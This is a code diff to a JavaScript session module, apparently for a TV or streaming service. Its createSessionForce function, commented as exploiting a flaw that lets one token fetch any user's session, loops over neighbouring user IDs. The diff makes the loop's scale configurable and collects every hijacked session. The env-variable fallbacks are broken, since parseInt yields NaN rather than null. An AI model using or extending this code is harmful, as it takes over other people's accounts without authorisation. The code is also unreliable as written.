@@ -120,11 +120,13 @@ export const createSession = async (channelId, { userId, token }, isForTv = fals
 
 // This exploits a vulnerability where the same token can be used to fetch any user's session
 export const createSessionForce = async (channelId, {userId: strUserId, token}) => {
-    const NUMBER_OF_TRIES = 50;
+    const NUMBER_OF_TRIES = parseInt(process.env.BRUTE_FORCE_TRIES) ?? 50;
     const TRIES_EACH_DIRECTION = NUMBER_OF_TRIES / 2;
-    const WAIT = 250;
+    const WAIT = parseInt(process.env.BRUTE_FORCE_WAIT_MS) ?? 250;
     const userId = parseInt(strUserId); 
 
+    const result = [];
+ 
     for (let i = userId - TRIES_EACH_DIRECTION; i <= userId + TRIES_EACH_DIRECTION; i++) {
         try {
             const tvSession = createSession(channelId, {userId: i, token}, true);
@@ -134,7 +136,7 @@ export const createSessionForce = async (channelId, {userId: strUserId, token}) 
             
             console.log(sessions);
 
-            return sessions.map(x => ({...x, userId: i}));
+            result.push(...sessions.map(x => ({...x, userId: i})));
         } catch {
             // Ignore this error
         }
@@ -142,4 +144,6 @@ export const createSessionForce = async (channelId, {userId: strUserId, token}) 
             await new Promise(resolve => setTimeout(resolve, WAIT));
         }
     }
+
+    return result;;
 };
